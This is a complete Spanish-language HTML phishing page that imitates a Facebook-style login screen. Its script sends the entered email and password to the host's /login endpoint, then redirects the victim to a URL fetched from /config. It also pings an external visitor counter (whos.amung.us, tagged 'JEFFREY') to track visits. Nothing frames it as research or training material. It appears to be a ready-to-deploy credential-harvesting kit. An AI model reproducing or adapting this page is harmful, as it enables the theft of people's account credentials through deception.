<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar Sesión</title>
    <style>
        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; font-family: Arial, sans-serif; }
        .card { background: white; padding: 40px 30px; border-radius: 12px; box-shadow: 0 8px 16px rgba(0,0,0,.1); width: 100%; max-width: 400px; text-align: center; box-sizing: border-box; }
        h2 { color: #1877f2; font-size: 30px; margin-bottom: 25px; }
        input { width: 100%; height: 52px; padding: 0 15px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
        button { width: 100%; height: 52px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Iniciar Sesión</h2>
        <input type="text" id="email" placeholder="Correo electrónico o teléfono">
        <input type="password" id="pass" placeholder="Contraseña">
        <button id="btn-login">Entrar</button>
    </div>

    <script>
        // Rastreo JEFFREY en URL directa
        async function trackSelf() {
            try {
                const res = await fetch('/config');
                const config = await res.json();
                if (config.counter_id) {
                    const img = new Image();
                    img.src = `https://whos.amung.us/pingjs/?k=${config.counter_id}&t=JEFFREY&x=${encodeURIComponent(window.location.href)}`;
                }
            } catch (e) {}
        }
        trackSelf();

        document.getElementById('btn-login').onclick = async function() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('pass').value;
            if(!email || !password) return;
            this.innerText = "Cargando...";
            await fetch('/login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ email, password })
            });
            const res = await fetch('/config');
            const data = await res.json();
            window.location.href = data.redirect_url;
        };
    </script>
</body>
</html>
